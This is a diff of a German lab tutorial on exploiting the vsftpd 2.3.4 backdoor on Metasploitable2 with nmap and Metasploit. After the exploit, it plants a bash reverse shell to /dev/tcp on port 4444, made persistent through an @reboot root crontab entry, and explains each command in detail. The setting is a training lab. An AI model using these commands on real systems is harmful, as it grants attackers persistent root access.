@@ -6,7 +6,7 @@ Wir wollen genau diese Schwachstellen dieser Maschine herausfinden und uns einen
 
 Dazu ist es notwendig, dass du Kali Linux, Metasploitable2 sowie pfSense in einer virtuellen Umgebung nutzen kannst. 
 
-Wir haben unser [Labnet](/10-practice-labs/labnet_infos.md) über Virtualbox eingerichtet. Solltest du dies auch tun, gibt es unzählige Guides im Internet, die dir dabei helfen, ein Labnet einzurichten.
+Wir haben unser [Labnet](/09-practice-labs/labnet_infos.md) über Virtualbox eingerichtet. Solltest du dies auch tun, gibt es unzählige Guides im Internet, die dir dabei helfen, ein Labnet einzurichten.
 
 Für den Test starten wir über Virtualbox alle drei Maschinen (Kali Linux, Metasploitable2 und pfSense).
 
@@ -51,7 +51,7 @@ Scanne das Netzwerk, um das Zielsystem zu identifizieren:
 sudo nmap -sP 192.168.1.0/24
 ```
 
-![Metasploit nmap scan](/10-practice-labs/ressources/pictures/metasploit-vsftpd1.png)
+![Metasploit nmap scan](/09-practice-labs/ressources/pictures/metasploit-vsftpd1.png)
 
 Wir scannen bewusst das gesamten Netzwerk mit dem Präfix `/24` und der IP-Adresse `192.168.1.0`, um 
 herauszufinden, welche Geräte sich in diesem Netzwerk befinden.
@@ -67,7 +67,7 @@ Dabei suchen wir nach einem Host mit offenen Ports wie 21, 22, 23, 80 usw. – w
 Metasploitable2.
 
 Angenommen, du findest:
-```kotlin
+```bash
 Nmap scan report for 192.168.1.0/24
 Host is up (0.00041s latency).
 PORT     STATE SERVICE
@@ -107,13 +107,13 @@ Gezielt den FTP-Port prüfen:
 sudo nmap -sV -p21 192.168.1.102
 ```
 Erwartete Ausgabe:
-```pgsql
+```bash
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.3.4
 ```
 Diese Version ist bekannt verwundbar für eine Backdoor-Shell über speziell formatierte Login-Daten.
 
-![nmap Versionsscan](/10-practice-labs/ressources/pictures/metasploit-vsftpd2.png)
+![nmap Versionsscan](/09-practice-labs/ressources/pictures/metasploit-vsftpd2.png)
 
 <div align=right>
 
@@ -150,7 +150,7 @@ Starte Metasploit in dem du folgenden Befehl in das Kali Linux Terminal eingibst
 msfconsole
 ```
 
-![msfconsole starten](/10-practice-labs/ressources/pictures/metasploit-vsftpd3.png)
+![msfconsole starten](/09-practice-labs/ressources/pictures/metasploit-vsftpd3.png)
 
 Nachdem msfconsole erfolgreich gestartet ist, wirst du merken, dass sich die Anzeige geändert hat. Das liegt daran, dass wir nun im der Shell des Programm `msfconsole` sind.
 
@@ -169,21 +169,21 @@ search vsftpd
 
 </div>
 
-![Exploit-Modul suchen](/10-practice-labs/ressources/pictures/metasploit-vsftpd4.png)
+![Exploit-Modul suchen](/09-practice-labs/ressources/pictures/metasploit-vsftpd4.png)
 
 ### 3.3 Exploit nutzen
 
 Du siehst 1 verfügbare Module, die unserem Suchbegriff enstprechen.
 Für unsere Backdoor nutzen wir das zweite Exploit-Modul. Um darauf zuzugreifen gibst du einfach folgendes in die `msfconsole`:
 
-```
+```bash
 use 1
 ```
 Der Befehl `use` ist selbstaussagend und die `1` steht für die Nummer des Exploits in unserer Liste. Mit `use 1` nutzen wir also das untere Modul, statt dem oberen, das die Nummer `0` hat.
 
 Dein Terminal sollte nun folgendermaßen aussehen:
 
-![Exploit-Modul nutzen](/10-practice-labs/ressources/pictures/metasploit-vsftpd5.png)
+![Exploit-Modul nutzen](/09-practice-labs/ressources/pictures/metasploit-vsftpd5.png)
 
 
 **Was ist bisher passiert?**
@@ -202,7 +202,7 @@ Wir haben `msfconsole` geöffnet und nach der Version gesucht und waren erfolgre
 
 Mit dem Befehl `option` siehst du, welche Möglichkeiten du mit diesem Exploit hast. 
 
-![msfconsole option-Befehl](/10-practice-labs/ressources/pictures/metasploit-vsftpd6.png)
+![msfconsole option-Befehl](/09-practice-labs/ressources/pictures/metasploit-vsftpd6.png)
 
 <div align=right>
 
@@ -218,12 +218,12 @@ Jetzt sepzifizieren wir in msfconsole den `RHOST`, also den Remote Host, und den
 
 Gib dazu im msfconsole folgenden Befehl ein, um den RHOST und den RPORT zu konfigurieren:
 
-```
+```bash
 set RHOSTS 192.168.1.102
 set RPORT 21
 ```
 
-![msfconsole RHOST und RPORT Konfiguration](/10-practice-labs/ressources/pictures/metasploit-vsftpd7.png)
+![msfconsole RHOST und RPORT Konfiguration](/09-practice-labs/ressources/pictures/metasploit-vsftpd7.png)
 
 Du könntest noch einmal den Befehl `options` eingeben, um zu überprüfen, ob deine Konfigurationen überommen worden sind, aber dies Bedarf es im Regelfall nicht.
 
@@ -233,7 +233,7 @@ Du könntest noch einmal den Befehl `options` eingeben, um zu überprüfen, ob d
 
 Nutze nun den Befehl `run` oder `exploit`, um den Angriff zu starten. Gib dazu im msfconsole einfach folgenden Befehl ein:
 
-```
+```bash
 run
 ``` 
 
@@ -242,13 +242,13 @@ Wenn alles erfolgreich ist, dann erhältst du folgende Meldung über das Termina
 [*] Backdoor service has been spawned
 [*] Command shell session 1 opened
 ```
-![msfconsole Exploit start](/10-practice-labs/ressources/pictures/metasploit-vsftpd8.png)
+![msfconsole Exploit start](/09-practice-labs/ressources/pictures/metasploit-vsftpd8.png)
 
 **Für Fortgeschrittene:**
 Wenn du bereits weißt, welchen Exploit du verwenden willst, kannst du das Exploit-Modul direkt auswählen und die Einstellungen vornehmen:
 
 Lade direkt das passende Exploit-Modul:
-```
+```bash
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.1.102
 set RPORT 21
@@ -277,12 +277,12 @@ Dazu habe ich in beiden Terminals den Befehl `whoami` eingegeben. Der `whoami`-B
 Kali zeigt mir den folgenden User:
 Das heißt, ich bin in meiner Kali Maschine der Nutzer mit dem Name Kali
 
-![Kali whoami](/10-practice-labs/ressources/pictures/metasploit-vsftpd9.png)
+![Kali whoami](/09-practice-labs/ressources/pictures/metasploit-vsftpd9.png)
 
 Metasploitable2 zeigt mir folgende User:
 Metasploitable2 hingegen zeigt mir, dass ich der Root Nutzer bin.
 
-![Metasploitable2 whoami](/10-practice-labs/ressources/pictures/metasploit-vsftpd10.png)
+![Metasploitable2 whoami](/09-practice-labs/ressources/pictures/metasploit-vsftpd10.png)
 
 ---
 
@@ -304,18 +304,48 @@ whoami
 2. Eine einfache Methode: Erzeuge einen Reverse-Shell Bash-Skript im Autostart:
 ```bash
 echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/backdoor.sh
-chmod +x /tmp/bd.sh
+chmod +x /tmp/backdoor.sh
 echo "@reboot root /tmp/backdoor.sh" >> /etc/crontab
 ```
 
-![Backdoor erstellen](/10-practice-labs/ressources/pictures/metasploit-vsftpd11.png)
+![Backdoor erstellen](/09-practice-labs/ressources/pictures/metasploit-vsftpd11.png)
+
+**Die Befehle aus 2. im Detail**
+
+**Erstellen des Backoor-Skripts:**
+`echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/backdoor.sh`
+- `echo "..."`: Gibt den Text innerhalb Anführungszeichen in die Konsole aus.
+- `bash -i`: startet interaktive Bash-Shell.
+- `>& /dev/tcp/192.168.1.100/4444`: Reverse Shell Sitzung mit `bash -i` an eine `TCP`-Verbindung
+    - `>`: leitet die Standardausgabe um.
+    - `&`: leitet zusätzlich die Standardfehlerausgabe um.
+    - `/dev/tcp/`: spezielles Linux-Feature; ermöglicht TCP-Verbindung direkt in der Bash-Shell zu erstellen. Es wird Angreifer-PC `192.168.1.100` auf Port `4444` aufgebaut.
+- `0>&1`: Leitet Standardeingabe (`0`) auf Standardausgabe (`1`) um, die bereits an TCP-Verbindung geleitet wird. Dadurch kann Agreifer über Netcat-Sitzung Befehle an Shell senden.
+- `> /tmp/backdoor.sh`: leitet gesamte Ausgabe des `echo`-Befehls in neue Datei names `backdoor.sh` im temporären Verzeichnis `/tmp/` um.
+
+**Datei ausführbar machen:**
+`chmod +x /tmp/backdoor.sh`
+- `chmod`: ändert Zugriffsrechte einer Datei.
+    - `+x`: fügt Ausführungsrecht (`execute`) hinzu, entscheiden, da sonst das System das Skript nicht startet.
+
+**Erstellen einer persistenten Aufgabe:**
+`echo "@reboot root /tmp/backdoor.sh" >> /etc/crontab`
+- `echo "..."`: Gibt den Cron-Job-Eintrag aus.
+- `@reboot`: spezielle Zeitangabe in `crontab`-Datei.
+    - bedeutet, dass nachfolgender Befehl jedes Mal ausgeführt wird, wenn das System neu gestartet wird.
+- `root /tmp/backdoor.sh`: Gibt an, dass der Befehl als `root`-Benutzer ausgeführt werden soll und ruft das Skript `backdoor.sh` auf.
+- `>> /etc/crontab`: Hängt den neuen Eintrag am Ende der System-Crontab-Datei an.
+
+**Was der Befehl als Ganzes tut**
+
+Diese Befehlskette automatisiert die Erstellung einer Reverse Shell, die dauerhaft auf dem Zielsystem persistiert. Der Angreifer muss lediglich auf seinem System einen Listener (z. B. mit `nc -lvnp 4444`) starten. Beim nächsten Neustart des infizierten Systems wird die `backdoor.sh` automatisch ausgeführt und stellt die Verbindung zum Angreifer her, der dann vollen Zugriff auf die Shell hat.
 
 Mit dem Befehl `cat /tmp/backdoor.sh` kannst du die Datei anzeigen lassen. Gib dazu einfach im Terminal folgenden Befehl ein:
 ```
 cat /tmp/backdoor.sh
 ```
 
-![Backdoor-Bash-Script anzeigen](/10-practice-labs/ressources/pictures/metasploit-vsftpd13.png)
+![Backdoor-Bash-Script anzeigen](/09-practice-labs/ressources/pictures/metasploit-vsftpd13.png)
 
 
 3. Starte Listener auf Kali:
@@ -323,7 +353,7 @@ cat /tmp/backdoor.sh
 nc -lvnp 4444
 ```
 
-![Backdoor erstellen](/10-practice-labs/ressources/pictures/metasploit-vsftpd12.png)
+![Backdoor erstellen](/09-practice-labs/ressources/pictures/metasploit-vsftpd12.png)
 
 Beim nächsten Reboot von Metasploitable2 verbindet sich die Shell zu deinem Kali.
 
@@ -367,14 +397,14 @@ script pentest_session.log
 
 ## Tools benötigt
 
-- nmap
-- msfconsole (Metasploit Framework)
-- netcat
-- bash
-- cron
-- Kali Linux VM
-- pfSense Gateway/Firewall
-- Metasploitable2
+- `nmap`
+- `msfconsole (Metasploit Framework)`
+- `netcat`
+- `bash`
+- `cron`
+- `Kali Linux VM`
+- `pfSense Gateway/Firewall`
+- `Metasploitable2`
 
 ---
 
